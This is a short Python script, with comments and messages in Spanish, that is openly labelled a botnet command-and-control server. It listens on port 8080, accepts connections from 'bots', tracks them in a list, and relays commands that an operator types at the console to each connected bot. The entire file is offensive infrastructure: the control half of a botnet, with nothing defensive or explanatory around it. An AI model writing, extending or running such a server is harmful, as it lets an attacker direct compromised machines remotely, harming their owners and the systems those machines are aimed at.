import socket
import threading

HOST = '0.0.0.0'
PORT = 8080

bots = []

def handle_bot(conn, addr):
    print(f"[+] Bot conectado: {addr}")
    bots.append(conn)
    while True:
        try:
            command = input("Comando para bots: ")
            if command:
                conn.send(command.encode())  # Enviar comando al bot
        except Exception as e:
            print(f"[!] Error con {addr}: {e}")
            bots.remove(conn)
            break

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((HOST, PORT))
    server_socket.listen(5)
    print("[*] Servidor C&C escuchando...")
    while True:
        conn, addr = server_socket.accept()
        threading.Thread(target=handle_bot, args=(conn, addr)).start()

if __name__ == "__main__":
    start_server()
